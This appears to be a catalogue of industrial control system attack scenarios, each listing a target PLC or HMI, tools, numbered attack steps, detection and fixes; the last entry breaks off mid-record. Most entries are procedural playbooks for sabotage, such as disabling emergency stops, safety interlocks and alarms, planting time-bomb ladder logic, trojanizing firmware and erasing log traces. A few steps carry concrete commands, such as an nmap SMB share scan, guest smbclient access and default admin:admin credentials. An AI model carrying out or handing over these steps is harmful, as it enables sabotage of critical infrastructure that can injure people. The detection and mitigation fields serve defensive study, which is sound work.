## HMI Config File Extraction via Open SMB Share

- **Attack Type**: HMI Exploitation
- **Target**: HMI Share Drive
- **Vulnerability**: Open SMB share access
- **MITRE**: T1021.002
- **Impact**: Credential disclosure, config leak
- **Tools**: Nmap, smbclient, Responder
- **Scenario**: Configuration backups and credentials are stored on shared folders accessible without authentication.
- **Attack Steps**: Step 1: Run nmap -p 445 --script smb-enum-shares 192.168.1.0/24 to find open SMB shares.Step 2: Use smbclient to connect: smbclient \\\\192.168.1.10\\HMIFiles with no username or guest.Step 3: Browse folders and download .hmi, .bak, .cfg files.Step 4: Examine file contents for credentials, IPs, and project structures.Step 5: Modify backup locally to introduce logic changes.Step 6: (Optional) Replace original config on SMB to simulate attack.Step 7: Document exposed paths and improper access control.
- **Detection**: SMB access logs
- **Solution**: Restrict share access, encrypt backups
- **Tags**: ICS SMB Abuse

## Log File Manipulation to Hide Attack Traces

- **Attack Type**: HMI Exploitation
- **Target**: Local/Remote Log Files
- **Vulnerability**: Lack of log integrity checks
- **MITRE**: T1070.001
- **Impact**: Forensic evasion
- **Tools**: Notepad++, WinSCP, FTK Imager
- **Scenario**: After gaining access, attacker modifies HMI log files to remove evidence of tampering.
- **Attack Steps**: Step 1: Locate the HMI’s local or remote log storage (e.g., C:\ProgramData\HMI\logs).Step 2: Use WinSCP or direct shell access to browse log folders.Step 3: Open logs with Notepad++ and find entries such as unauthorized login attempts, error logs, or alarm changes.Step 4: Manually remove or alter specific lines to erase traces.Step 5: Save and close file without changing modified timestamps (optional: use touch or TimeStomp).Step 6: Confirm that audit tools do not report anomaly.Step 7: Log file differences before/after for education comparison.
- **Detection**: Hash mismatch (if enabled)
- **Solution**: Enforce signed and immutable logs
- **Tags**: ICS Log Tampering

## Uploading Malicious Ladder Logic via Engineering Workstation

- **Attack Type**: PLC Logic Injection
- **Target**: Allen-Bradley PLC
- **Vulnerability**: Lack of logic verification and workstation security
- **MITRE**: T0835 - Modify Control Logic
- **Impact**: Process disruption
- **Tools**: RSLogix 500, USB drive
- **Scenario**: Attacker gains access to the engineering workstation used to program PLCs and uploads a modified ladder logic file that causes erratic behavior in actuators.
- **Attack Steps**: Step 1: Attacker enters the facility or uses phishing to access the engineering workstation.Step 2: Inserts USB containing malicious ladder logic project file.Step 3: Opens RSLogix 500 software and loads the altered project.Step 4: Connects to the target PLC over Ethernet or serial.Step 5: Uploads the modified logic containing hidden routines (e.g., infinite loop to disable pumps).Step 6: Monitors for changes while remaining undetected.
- **Detection**: Monitor PLC upload events, checksum comparison of ladder logic
- **Solution**: Enforce workstation hardening, logic file signing
- **Tags**: ladder logic, USB, RSLogix, logic tampering

## Remote Firmware Replacement over Telnet

- **Attack Type**: PLC Firmware Exploitation
- **Target**: Legacy PLC (Modicon)
- **Vulnerability**: Insecure remote management & default credentials
- **MITRE**: T0846 - Modify Firmware
- **Impact**: Long-term device compromise
- **Tools**: Custom Python script, Telnet client
- **Scenario**: Using unsecured Telnet access, attacker uploads a backdoored firmware to a legacy PLC remotely.
- **Attack Steps**: Step 1: Attacker scans network and finds PLC with open Telnet port.Step 2: Uses default credentials to log in to the PLC (e.g., admin:admin).Step 3: Downloads current firmware for analysis.Step 4: Modifies firmware binary to inject backdoor shell or logic trigger.Step 5: Re-uploads the modified firmware via Telnet.Step 6: Restarts PLC to load malicious firmware.
- **Detection**: Unexpected Telnet session, modified firmware hash
- **Solution**: Disable Telnet, use signed firmware, change default creds
- **Tags**: firmware tampering, telnet, legacy

## Backdoor Logic via Engineering Software Exploit

- **Attack Type**: Logic Bomb Injection
- **Target**: Siemens S7-1200 PLC
- **Vulnerability**: Compromised development environment
- **MITRE**: T0835 - Modify Control Logic
- **Impact**: Timed sabotage or stealth attack
- **Tools**: Modified Siemens TIA Portal, Trojan Installer
- **Scenario**: Engineer unknowingly installs a trojanized version of programming software that injects malicious logic during normal uploads.
- **Attack Steps**: Step 1: Attacker shares a cracked version of TIA Portal containing injected payload.Step 2: Engineer installs the software on an HMI engineering station.Step 3: When the engineer uploads new configuration, malicious logic (e.g., time-based shutdown) is auto-injected.Step 4: PLC operates normally until trigger condition is met.Step 5: Attacker maintains remote access through scheduled logic trigger.
- **Detection**: Logic comparison tools, software integrity checks
- **Solution**: Use verified software sources, hash verification
- **Tags**: logic bomb, trojan IDE, engineer manipulation

## Exploiting OTA PLC Firmware Update Feature

- **Attack Type**: Firmware Exploit
- **Target**: Wireless PLC with Zigbee
- **Vulnerability**: Unauthenticated OTA update process
- **MITRE**: T0846 - Modify Firmware
- **Impact**: Remote code execution, safety bypass
- **Tools**: Firmware packager, Zigbee transceiver
- **Scenario**: Attacker takes advantage of Over-the-Air firmware update support in wireless PLC to deploy custom firmware.
- **Attack Steps**: Step 1: Attacker captures OTA firmware update signal in Zigbee using sniffing tools.Step 2: Crafts malicious firmware update with added packet manipulation routines.Step 3: Spoofs the update signal using a Zigbee transmitter.Step 4: Wireless PLC accepts and installs fake firmware.Step 5: Malicious logic activates to disable safety interlocks.
- **Detection**: Zigbee packet analysis, firmware audit
- **Solution**: Secure OTA update process, add digital signatures
- **Tags**: OTA, wireless PLC, Zigbee, spoofing

## Logic Upload via Compromised USB-to-RS232 Adapter

- **Attack Type**: Hardware-Based Upload Attack
- **Target**: Industrial PLC using serial comm
- **Vulnerability**: Lack of validation on adapter communication
- **MITRE**: T0835 - Modify Control Logic
- **Impact**: Unauthorized logic injection
- **Tools**: Custom USB implant, serial monitor tool
- **Scenario**: Attacker tampers with a USB-to-RS232 adapter to inject malicious logic when connected to a PLC.
- **Attack Steps**: Step 1: Attacker swaps original USB-to-RS232 adapter with modified one containing a microcontroller.Step 2: Engineer unknowingly uses tampered adapter for PLC maintenance.Step 3: Adapter injects pre-stored ladder logic containing malicious routine upon connection.Step 4: PLC accepts logic as part of legitimate update.Step 5: Routine disrupts normal control sequences (e.g., sets false sensor values).
- **Detection**: Monitor adapter behavior, unexpected traffic logs
- **Solution**: Use trusted hardware, block unauthorized serial uploads
- **Tags**: USB, serial, supply chain, logic injection

## Remote Firmware Manipulation via FTP on Schneider PLC

- **Attack Type**: PLC Firmware Exploitation
- **Target**: Schneider M340 PLC
- **Vulnerability**: Open FTP access with no auth checks
- **MITRE**: T0846
- **Impact**: Alarm suppression, silent sabotage
- **Tools**: FileZilla, Hex Editor, Wireshark
- **Scenario**: Attacker uses FTP access to Schneider PLCs to replace original firmware with a trojanized version containing logic to disable alarms.
- **Attack Steps**: Step 1: Use Nmap to scan ICS subnet and discover Schneider PLC with port 21 (FTP) open.Step 2: Log in to FTP using default credentials (e.g., “admin:admin”) using FileZilla.Step 3: Download current firmware file from PLC to local system.Step 4: Modify the firmware using a Hex Editor to inject logic that disables alarm outputs on logic trigger.Step 5: Re-upload modified firmware via FileZilla FTP client.Step 6: Reboot the PLC to apply the new firmware.Step 7: Monitor traffic using Wireshark to confirm silent operation.
- **Detection**: Monitor firmware hash, alert on FTP writes
- **Solution**: Disable FTP, require signed firmware
- **Tags**: FTP, firmware, Schneider

## Rogue Ladder Logic Injection via Phishing Access

- **Attack Type**: PLC Logic Injection
- **Target**: Allen-Bradley PLC
- **Vulnerability**: Lack of access control, phishing exposure
- **MITRE**: T0835
- **Impact**: Valve malfunction, false process triggering
- **Tools**: Gophish, RSLogix 500, USB Rubber Ducky
- **Scenario**: Attacker gains access to engineering station through phishing and uploads a harmful logic routine during maintenance hours.
- **Attack Steps**: Step 1: Send phishing email with payload using Gophish, targeting ICS engineer.Step 2: Upon clicking, payload executes and drops remote access tool.Step 3: Attacker uses TeamViewer or RDP to access engineer's workstation.Step 4: Launch RSLogix 500 remotely.Step 5: Inject malicious ladder logic (e.g., infinite loop to flood control valves).Step 6: Download logic to PLC during off-hours.Step 7: Engineer is unaware as logic appears similar to normal routines.Step 8: Logic disrupts valve control when sensor value reaches threshold.
- **Detection**: Monitor remote access sessions, logic change audits
- **Solution**: Use MFA, secure engineering PCs
- **Tags**: phishing, remote logic upload

## Firmware Rollback Exploit to Load Vulnerable Version

- **Attack Type**: Firmware Downgrade Attack
- **Target**: Siemens S7-300
- **Vulnerability**: Lack of version verification in firmware
- **MITRE**: T0846
- **Impact**: Long-term backdoor, persistent access
- **Tools**: Firmware archive, Vendor Update Tool, Burp Suite
- **Scenario**: Exploiting systems with no version verification, attacker loads an older firmware with known logic flaw to create backdoor access.
- **Attack Steps**: Step 1: Identify target PLC using Shodan and vendor model enumeration.Step 2: Download archived vulnerable firmware version from vendor or underground sources.Step 3: Use vendor’s official Firmware Update Tool to prepare the rollback package.Step 4: Connect to PLC via USB or Ethernet.Step 5: Use Burp Suite to intercept and modify update protocol if needed.Step 6: Upload vulnerable firmware version.Step 7: Trigger backdoor command embedded in old firmware logic.Step 8: Establish persistent access.
- **Detection**: Firmware version logs, behavior anomalies
- **Solution**: Prevent downgrade, cryptographically sign firmware
- **Tags**: rollback, version spoofing

## Direct Flash Memory Manipulation via Debug Interface

- **Attack Type**: Hardware Logic Tampering
- **Target**: Embedded ARM-based PLC
- **Vulnerability**: Physical debug interface left active
- **MITRE**: T0846
- **Impact**: Stealth sabotage, process control disruption
- **Tools**: JTAGulator, OpenOCD, Flash Programmer
- **Scenario**: Using a physical JTAG debugger, attacker flashes custom firmware into PLC flash memory.
- **Attack Steps**: Step 1: Physically access PLC cabinet and locate JTAG/SWD header.Step 2: Connect JTAGulator to identify pinout.Step 3: Use OpenOCD to interface with debug port.Step 4: Dump current firmware to analyze logic.Step 5: Modify firmware binary and recompile.Step 6: Flash modified firmware using Flash Programmer tool.Step 7: Reboot PLC; logic now includes hidden routines (e.g., timer-based sabotage).Step 8: Exit site leaving no traces on HMI or SCADA interface.
- **Detection**: Detect physical tamper, monitor JTAG usage
- **Solution**: Disable debug interfaces post-deployment
- **Tags**: JTAG, physical tamper, firmware

## Using Configuration Backup to Inject Malicious Logic

- **Attack Type**: Logic File Manipulation
- **Target**: Siemens HMI + S7 PLC
- **Vulnerability**: Unvalidated backup content
- **MITRE**: T0835
- **Impact**: Process control override
- **Tools**: WinCC Flexible, 7-Zip, Notepad++
- **Scenario**: Attacker recovers configuration backup from maintenance laptop and modifies it to contain malicious automation behavior.
- **Attack Steps**: Step 1: Obtain access to engineer’s laptop containing project backups using USB Rubber Ducky.Step 2: Locate configuration archive (.zip/.zlib format).Step 3: Extract using 7-Zip and open files in Notepad++.Step 4: Modify logic sections (e.g., force outputs ON during specific condition).Step 5: Repack archive.Step 6: Upload project to HMI or PLC using WinCC Flexible.Step 7: Wait for engineer to re-download backup to live PLC.Step 8: Logic executes during normal operation.
- **Detection**: Change audit log comparison, logic checksum
- **Solution**: Isolate backup devices, hash file integrity
- **Tags**: backup abuse, project hijack

## Remote Logic Upload via Unauthenticated VNC Access

- **Attack Type**: Remote Control Abuse
- **Target**: Allen-Bradley ControlLogix
- **Vulnerability**: No auth on remote access tool
- **MITRE**: T0835
- **Impact**: Relay hijack, motor activation
- **Tools**: VNC Viewer, Studio 5000
- **Scenario**: PLC programming is done via a workstation that exposes VNC with no password, allowing remote logic upload.
- **Attack Steps**: Step 1: Use Shodan or Nmap to find exposed VNC service.Step 2: Connect using VNC Viewer (no password required).Step 3: Access PLC programming software (Studio 5000).Step 4: Open existing project or create new one with logic to manipulate motors.Step 5: Upload malicious logic to the target PLC.Step 6: Disconnect silently.Step 7: Monitor output relays for desired effects.
- **Detection**: VNC session monitor, unexpected uploads
- **Solution**: Secure remote access, disable unused services
- **Tags**: VNC, remote, logic upload

## Insider Reprogramming During Maintenance Downtime

- **Attack Type**: Insider Logic Attack
- **Target**: Allen-Bradley MicroLogix
- **Vulnerability**: Trusted employee bypasses security
- **MITRE**: T0835
- **Impact**: Insider sabotage
- **Tools**: Laptop with RSLogix 500, USB, Wireshark
- **Scenario**: A rogue employee with access uploads altered ladder logic during scheduled downtime.
- **Attack Steps**: Step 1: Insider connects laptop to PLC maintenance port.Step 2: Launches RSLogix 500 and downloads current logic for reference.Step 3: Creates a new version with covert function (e.g., disabling alarms after 2AM).Step 4: Uploads logic back to the PLC.Step 5: Uses Wireshark to confirm traffic looks legitimate.Step 6: Closes laptop and logs out before shift ends.Step 7: Logic executes silently days later.
- **Detection**: Track uploads, monitor variable change logs
- **Solution**: Role separation, audit engineer activity
- **Tags**: insider, logic edit

## Logic Tampering via Compromised Remote Vendor VPN

- **Attack Type**: Third-party Logic Injection
- **Target**: Remote-connected PLCs
- **Vulnerability**: Poor VPN credential security
- **MITRE**: T0835
- **Impact**: Vendor impersonation, logic reversal
- **Tools**: VPN client, Studio 5000, Mimikatz
- **Scenario**: Vendor's VPN credentials are stolen, allowing attacker to impersonate remote engineer and push new PLC logic.
- **Attack Steps**: Step 1: Use phishing + Mimikatz to steal vendor VPN creds.Step 2: Connect via official VPN client to ICS site.Step 3: Launch Studio 5000 and open target project.Step 4: Modify ladder logic to invert motor control signals.Step 5: Upload logic to PLC under vendor identity.Step 6: Disconnect VPN and monitor disruption remotely.
- **Detection**: Monitor vendor sessions, logic fingerprinting
- **Solution**: Enforce MFA, VPN activity logging
- **Tags**: remote access, vendor, logic

## Hijacking PLC Update Over Insecure Web HMI

- **Attack Type**: HMI-to-PLC Logic Hijack
- **Target**: Web-based HMI and PLC
- **Vulnerability**: No auth or logic validation on HMI
- **MITRE**: T0835
- **Impact**: Web-based logic hijack
- **Tools**: Burp Suite, Chrome DevTools
- **Scenario**: HMI allows logic changes from web interface, which is unprotected and accessible from internal VLAN.
- **Attack Steps**: Step 1: Access internal VLAN from compromised device.Step 2: Open PLC/HMI configuration interface in browser.Step 3: Use Burp Suite or DevTools to intercept HTTP POST payload used to upload ladder logic.Step 4: Craft custom payload that includes malicious logic routine.Step 5: Replay the modified request to HMI interface.Step 6: HMI pushes logic to connected PLC.Step 7: Wait for logic to execute in production.
- **Detection**: Monitor HMI HTTP traffic, validate logic updates
- **Solution**: Add session tokens, secure web interface
- **Tags**: HMI, HTTP injection, PLC hijack

## Logic Disruption via Cloned Engineering Station

- **Attack Type**: Identity Spoofing
- **Target**: Allen-Bradley PLC
- **Vulnerability**: Identity spoofing and workstation trust
- **MITRE**: T0835
- **Impact**: Undetected logic conflict
- **Tools**: MACChanger, RSLogix, Wireshark
- **Scenario**: Attacker clones the engineering workstation, mimics IP/MAC, and uploads conflicting logic during shift change.
- **Attack Steps**: Step 1: Use Wireshark to sniff network and collect engineering workstation IP and MAC.Step 2: Use MACChanger to spoof MAC and set same IP.Step 3: Install RSLogix and open dummy project.Step 4: Connect to PLC during engineer’s break.Step 5: Upload malicious logic with identical project name.Step 6: Engineer later opens PLC logic and assumes it's the correct version.Step 7: Malicious code executes silently.
- **Detection**: Watch for duplicate MAC/IP, timestamped logs
- **Solution**: Device fingerprinting, alerts for duplicate IPs
- **Tags**: MAC spoof, logic conflict

## Malicious Logic Injection via Remote Desktop Compromise

- **Attack Type**: Remote Programming Attack
- **Target**: Allen-Bradley PLC
- **Vulnerability**: Weak RDP credentials, no 2FA
- **MITRE**: T0835
- **Impact**: Safety failure in critical event
- **Tools**: RDP client, RSLogix 5000, Process Monitor
- **Scenario**: The attacker gains access to a PLC programming station via RDP and uploads malicious logic that disables emergency stops.
- **Attack Steps**: Step 1: Use Hydra to brute-force RDP password on engineering workstation.Step 2: Once inside, open RSLogix 5000.Step 3: Download existing logic to local folder for backup.Step 4: Modify emergency stop logic in ladder file.Step 5: Upload the altered logic back to the PLC.Step 6: Run Process Monitor to ensure no alerts are triggered.Step 7: Log out and leave no trace.Step 8: Wait for logic to execute during emergency.
- **Detection**: Detect unusual RDP logins, logic changes
- **Solution**: Harden RDP, restrict access to programming station
- **Tags**: RDP, logic sabotage

## Exploiting PLC Web Interface for Logic Injection

- **Attack Type**: Web-based Logic Upload
- **Target**: Web-enabled PLC
- **Vulnerability**: No authentication on web logic upload
- **MITRE**: T0835
- **Impact**: Unauthorized logic change
- **Tools**: Browser (Chrome), Burp Suite, Ladder Editor
- **Scenario**: PLC has an embedded web interface that allows logic uploads without authentication.
- **Attack Steps**: Step 1: Use Nmap to detect port 80/443 open on PLC.Step 2: Visit PLC’s web admin page in Chrome.Step 3: Navigate to the logic upload page.Step 4: Craft malicious ladder file with disabled safety routine using Ladder Editor.Step 5: Intercept upload request with Burp Suite.Step 6: Confirm logic file is accepted without login.Step 7: Trigger new logic and verify on PLC HMI.
- **Detection**: Monitor PLC config changes via web interface
- **Solution**: Add authentication and IP whitelisting
- **Tags**: PLC web interface, HMI

## Firmware Patch via Mobile Device on Wireless PLC

- **Attack Type**: Mobile-Assisted Firmware Injection
- **Target**: Wireless PLC
- **Vulnerability**: Unsecured mobile integration
- **MITRE**: T0846
- **Impact**: Disable logging and audit trail
- **Tools**: Termux (Android), SSH client, Binary Patcher
- **Scenario**: Engineer’s mobile phone is compromised and used to push modified firmware during wireless maintenance task.
- **Attack Steps**: Step 1: Deliver Android malware via social engineering using Kali + EvilAPK.Step 2: Compromised phone connects to PLC over Wi-Fi.Step 3: Attacker connects to phone using Termux SSH.Step 4: Locate firmware patch app on phone and tamper binary using Hex Patcher.Step 5: Use phone to initiate firmware upload over Wi-Fi.Step 6: Modified logic disables system logs.Step 7: Disconnect after update is complete.
- **Detection**: Monitor firmware uploads over Wi-Fi
- **Solution**: Isolate PLC wireless maintenance from BYOD
- **Tags**: mobile attack, wireless PLC

## Upload Malicious Logic via Cloud-Based IDE

- **Attack Type**: Cloud Logic Injection
- **Target**: PLCs using cloud IDE
- **Vulnerability**: Shared access with no code review
- **MITRE**: T0835
- **Impact**: Hidden logic flaws in production
- **Tools**: Codesys IDE (cloud), Browser DevTools, Ngrok
- **Scenario**: A cloud-based PLC IDE is compromised, allowing attacker to inject logic before deployment to factory PLCs.
- **Attack Steps**: Step 1: Gain access to cloud-based IDE using phishing and credential reuse.Step 2: Open project meant for production deployment.Step 3: Modify logic to include subtle defect (e.g., delay in coolant shutoff).Step 4: Save changes and commit to shared workspace.Step 5: Engineer downloads project and deploys to factory PLCs.Step 6: Use Ngrok tunnel to monitor behavior from outside.Step 7: Logic executes during regular production run.
- **Detection**: Logic diff checks, code review before deployment
- **Solution**: Use private IDE, enforce logic verification
- **Tags**: cloud IDE, logic defect

## Exploiting External SD Card Slot for Firmware Drop

- **Attack Type**: Removable Media Firmware Injection
- **Target**: PLCs with SD support
- **Vulnerability**: Lack of SD card authentication
- **MITRE**: T0846
- **Impact**: Relay malfunction, I/O control
- **Tools**: SD card writer, Modified firmware binary, Firmware loader
- **Scenario**: PLC supports firmware loading via SD card. Attacker replaces the SD card with one containing malicious firmware.
- **Attack Steps**: Step 1: Clone original firmware using Firmware Downloader Tool.Step 2: Modify binary logic to trigger relay toggling using Hex Workshop.Step 3: Flash modified firmware to SD card using BalenaEtcher.Step 4: Physically insert SD into PLC SD slot.Step 5: PLC auto-loads firmware on next reboot.Step 6: Logic executes without human intervention.
- **Detection**: Monitor firmware boot logs
- **Solution**: Disable SD firmware boot, restrict port
- **Tags**: SD card, physical access

## Logic Injection via Exploited PLC Programming API

- **Attack Type**: API-Based Logic Exploit
- **Target**: API-enabled PLC
- **Vulnerability**: Exposed logic upload API with no auth
- **MITRE**: T0835
- **Impact**: Process stalling
- **Tools**: Postman, PLC REST API docs, Custom Python Script
- **Scenario**: Attacker uses poorly secured API exposed by vendor programming tool to upload rogue logic to PLC.
- **Attack Steps**: Step 1: Use Nmap to discover exposed API port.Step 2: Query API using Postman to identify endpoint for logic update.Step 3: Craft JSON payload with manipulated logic in Python.Step 4: Send POST request to upload endpoint.Step 5: PLC accepts and installs the new logic.Step 6: Logic initiates periodic motor stalling sequence.Step 7: Monitor device for success.
- **Detection**: API request monitoring, request fingerprinting
- **Solution**: Disable or secure API access
- **Tags**: API abuse, vendor tool

## Modbus Write Exploit to Overwrite Logic Section

- **Attack Type**: Protocol Abuse Attack
- **Target**: Modbus PLC
- **Vulnerability**: No write protection on memory
- **MITRE**: T0835
- **Impact**: Logic overwrite, critical process halt
- **Tools**: Modbus Fuzzer, Scapy, Wireshark
- **Scenario**: Attacker uses raw Modbus TCP write command to overwrite memory block storing logic.
- **Attack Steps**: Step 1: Use Modbus Fuzzer to map coil/register memory regions.Step 2: Identify logic memory register (e.g., 40001).Step 3: Craft raw Modbus TCP write command in Scapy.Step 4: Inject new binary logic fragment using multiple packet bursts.Step 5: Monitor device behavior using Wireshark.Step 6: Verify logic change via unexpected output behavior.
- **Detection**: Protocol anomaly detection
- **Solution**: Enable write protections and Modbus firewall
- **Tags**: Modbus, raw write, memory

## Disguising Logic Payload as Firmware Update Patch

- **Attack Type**: Payload Obfuscation Attack
- **Target**: PLCs using signed patch updates
- **Vulnerability**: Misuse of signing keys
- **MITRE**: T0846
- **Impact**: Disguised logic change
- **Tools**: Python Obfuscator, Firmware Signing Tool, Wireshark
- **Scenario**: The attacker wraps a logic-altering payload into a fake firmware patch, bypassing admin validation.
- **Attack Steps**: Step 1: Use legitimate firmware update shell as a base.Step 2: Inject ladder logic into patch using Python Obfuscator.Step 3: Sign the patch using stolen Firmware Signing Tool.Step 4: Deliver patch via internal update channel.Step 5: Engineer installs patch unaware of embedded logic change.Step 6: Monitor for execution of new ladder block.Step 7: Use Wireshark to verify command outputs.
- **Detection**: Validate logic post-update, key hygiene
- **Solution**: Use secure PKI & patch review
- **Tags**: firmware patch, disguise

## Exploit of Engineering Software Auto-Sync Feature

- **Attack Type**: Auto-Sync Exploit
- **Target**: Allen-Bradley PLC
- **Vulnerability**: Auto-sync without confirmation
- **MITRE**: T0835
- **Impact**: Silent logic overwrite
- **Tools**: RSLogix 500, Process Hacker, Autoruns
- **Scenario**: Engineering tool automatically syncs with PLC on boot. Attacker modifies the project file so logic auto-uploads on software launch.
- **Attack Steps**: Step 1: Steal engineering laptop.Step 2: Modify RSLogix project to embed sabotage logic.Step 3: Save project to default startup directory.Step 4: Use Autoruns to ensure auto-launch.Step 5: When engineer boots laptop and connects, auto-sync uploads logic to PLC.Step 6: Logic changes go unnoticed during normal operation.Step 7: Use Process Hacker to hide logs of the upload.
- **Detection**: Compare project hash on launch
- **Solution**: Disable auto-sync or prompt confirmation
- **Tags**: logic auto-sync, sabotage

## Man-in-the-Middle Logic Swap via Network Tap

- **Attack Type**: Network Logic Interception
- **Target**: Ethernet-connected PLC
- **Vulnerability**: Unencrypted logic transfers
- **MITRE**: T0835
- **Impact**: Logic altered mid-flight
- **Tools**: Wireshark, Ettercap, Custom Logic Injector
- **Scenario**: Attacker taps traffic between engineering station and PLC, intercepts and replaces logic file mid-transfer.
- **Attack Steps**: Step 1: Place network tap or hub between PLC and engineer PC.Step 2: Use Wireshark to monitor ladder logic upload sequence.Step 3: Use Ettercap to perform real-time MITM.Step 4: Swap original logic file with injected version during upload.Step 5: Monitor PLC to verify logic takes effect.Step 6: Remove tap to avoid detection.
- **Detection**: Alert on mismatched file checksums
- **Solution**: Encrypt ladder logic transfer
- **Tags**: MITM, ladder injection

## Logic Upload via Social Engineering During Site Visit

- **Attack Type**: Physical Access Logic Attack
- **Target**: MicroLogix PLC
- **Vulnerability**: No personnel verification for contractors
- **MITRE**: T0835
- **Impact**: Signal loss during operations
- **Tools**: RSLogix Micro Starter, USB Drive, Fake ID Badge
- **Scenario**: Attacker poses as a maintenance contractor and uploads malicious logic during routine checkup.
- **Attack Steps**: Step 1: Attacker prepares custom ladder logic with sabotage routine using RSLogix Micro Starter.Step 2: Loads it onto a USB Drive.Step 3: Gains access to facility by posing as contracted technician with Fake ID Badge.Step 4: During inspection, connects laptop to MicroLogix PLC via serial.Step 5: Uploads malicious logic.Step 6: Disconnects without triggering alarms.Step 7: Logic triggers during night shift to cut control signal.
- **Detection**: Monitor maintenance uploads, verify contractors
- **Solution**: Secure contractor verification, supervision
- **Tags**: physical, social engineering

## Exploit via Compromised Vendor Configuration Template

- **Attack Type**: Supply Chain Attack
- **Target**: Allen-Bradley PLCs
- **Vulnerability**: Trusted but altered templates
- **MITRE**: T0835
- **Impact**: Widespread logic error across systems
- **Tools**: RSLogix 5000, Template Downloader, GitHub CLI
- **Scenario**: Vendor provides pre-approved PLC templates, one of which has been altered to include harmful routines.
- **Attack Steps**: Step 1: Attacker compromises vendor GitHub repository using stolen credentials.Step 2: Edits ladder logic template to include code that reverses actuator output.Step 3: Commits changes using GitHub CLI.Step 4: Engineering team downloads the template via official Template Downloader.Step 5: Engineer unknowingly uploads template to multiple PLCs.Step 6: Harmful logic triggers when temperature exceeds a threshold.Step 7: No alerts, since logic appears vendor-certified.
- **Detection**: Compare templates with trusted hash
- **Solution**: Verify templates via checksum and source
- **Tags**: vendor template, supply chain

## USB Autorun Payload for PLC Programming Station

- **Attack Type**: Logic Auto-execution Exploit
- **Target**: Allen-Bradley PLC
- **Vulnerability**: USB autorun vulnerability
- **MITRE**: T0835
- **Impact**: Silent logic replacement
- **Tools**: USB Rubber Ducky, AutoHotKey Script, RSLogix 500
- **Scenario**: A USB stick with an autorun script uploads altered ladder logic upon insertion into engineering station.
- **Attack Steps**: Step 1: Attacker prepares a script with AutoHotKey to open RSLogix, load a logic file, and upload it to the connected PLC.Step 2: Compiles the script into an executable.Step 3: Loads it onto a USB Rubber Ducky disguised as a flash drive.Step 4: Drops USB in facility parking lot labeled "Project Update".Step 5: Engineer inserts it, triggering autorun.Step 6: The script runs, uploads logic silently.Step 7: PLC now runs manipulated control logic.
- **Detection**: Monitor USB events, logic change logs
- **Solution**: Disable autorun, block USB devices
- **Tags**: autorun, USB payload

## Firmware Update Hijack via Software Updater DLL Injection

- **Attack Type**: Update Mechanism Exploit
- **Target**: Siemens or Schneider PLC
- **Vulnerability**: Unsigned DLLs accepted by update tool
- **MITRE**: T0846
- **Impact**: Stealth firmware change
- **Tools**: DLL Injector, Process Explorer, Vendor Updater
- **Scenario**: Attacker injects a malicious DLL into a vendor’s update utility to replace firmware logic silently.
- **Attack Steps**: Step 1: Gain access to engineering station via phishing.Step 2: Use DLL Injector to create a custom DLL that modifies firmware contents during update.Step 3: Inject DLL into Vendor Updater process.Step 4: Engineer performs regular firmware update.Step 5: DLL silently replaces firmware file with attacker’s version.Step 6: Use Process Explorer to verify injection persistence.Step 7: Logic is now modified without engineer’s knowledge.
- **Detection**: Monitor DLL loads during update
- **Solution**: Use signed libraries and DLL whitelisting
- **Tags**: DLL injection, updater abuse

## Memory Injection via PLC Debug Interface Exploit

- **Attack Type**: Live Memory Injection
- **Target**: Industrial PLCs
- **Vulnerability**: Active debugging interface left unsecured
- **MITRE**: T0846
- **Impact**: Process logic altered mid-run
- **Tools**: GDB, Debug Cable, OpenOCD
- **Scenario**: Attacker exploits unlocked debugging interface to inject logic fragments directly into PLC memory.
- **Attack Steps**: Step 1: Access physical site and connect to debug header using Debug Cable.Step 2: Launch GDB (GNU Debugger) with OpenOCD to attach to running PLC.Step 3: Locate memory block storing current logic.Step 4: Use memory injection commands to overwrite small section of logic.Step 5: Resume PLC operation; new logic activates on cycle.Step 6: Disconnect and leave no trace.Step 7: Later revisit logic to adjust timing.
- **Detection**: Monitor debug port usage
- **Solution**: Lock debug ports after deployment
- **Tags**: live memory, debugger

## Exploit in PLC Email Alert System to Inject Code

- **Attack Type**: Logic Injection via Email System
- **Target**: Email-enabled PLC
- **Vulnerability**: Weak parsing logic for alert processing
- **MITRE**: T0835
- **Impact**: Alerts silenced by rogue email
- **Tools**: SMTP Client, Packet Sender, Logic Crafting Tool
- **Scenario**: PLC that sends alerts via SMTP is exploited to accept crafted command emails with logic instructions.
- **Attack Steps**: Step 1: Discover PLC with email alert capabilities.Step 2: Use SMTP Client to craft email mimicking alert format.Step 3: Insert encoded logic instructions into subject/body.Step 4: Send email to PLC’s SMTP handler.Step 5: PLC misinterprets crafted email as configuration update.Step 6: Logic is modified to disable alarms on sensor input.Step 7: Verify changes using Packet Sender.
- **Detection**: Monitor SMTP payloads
- **Solution**: Harden email parsing and validate inputs
- **Tags**: SMTP injection, email logic

## Exploit of Historical Snapshot Restoration System

- **Attack Type**: Logic Rollback Injection
- **Target**: Siemens S7 PLCs
- **Vulnerability**: Unverified historical file restoration
- **MITRE**: T0835
- **Impact**: Hidden logic activation
- **Tools**: WinCC TIA Portal, File Date Changer, Logic Editor
- **Scenario**: Engineering software allows snapshot rollback, which attacker exploits to load logic with timebomb payload.
- **Attack Steps**: Step 1: Access archived snapshots using WinCC TIA Portal.Step 2: Inject hidden routine in logic file (e.g., after 30 days, override setpoint).Step 3: Modify timestamps using File Date Changer to appear old.Step 4: Engineer performs logic rollback unaware of change.Step 5: New logic executes as “old trusted” version.Step 6: Wait for time-based logic to trigger.Step 7: Observe impact remotely.
- **Detection**: Compare logic versions by hash, not timestamp
- **Solution**: Block logic restoration without review
- **Tags**: rollback, timebomb

## Vendor Remote Update Hijack via DNS Spoofing

- **Attack Type**: Remote Update Spoofing
- **Target**: Remote PLC update tools
- **Vulnerability**: DNS not validated before firmware download
- **MITRE**: T0846
- **Impact**: Remote logic hijack
- **Tools**: dnsspoof, Custom Web Server, Burp Suite
- **Scenario**: Attacker spoofs DNS to redirect engineering tool’s update request to a fake firmware server.
- **Attack Steps**: Step 1: Attacker installs dnsspoof on compromised gateway.Step 2: When PLC software checks for update, DNS query is intercepted.Step 3: Request is redirected to attacker’s Custom Web Server.Step 4: Server delivers trojan firmware with altered logic.Step 5: Engineer unknowingly installs fake update.Step 6: Use Burp Suite to monitor interaction and simulate success message.
- **Detection**: Monitor DNS responses, use DNSSEC
- **Solution**: Use HTTPS and signed firmware
- **Tags**: DNS spoof, firmware trap

## Upload Logic via Exploited Bluetooth Maintenance Port

- **Attack Type**: Wireless Logic Upload Attack
- **Target**: Bluetooth-enabled PLC
- **Vulnerability**: Default pairing keys, no encryption
- **MITRE**: T0835
- **Impact**: Wireless sabotage
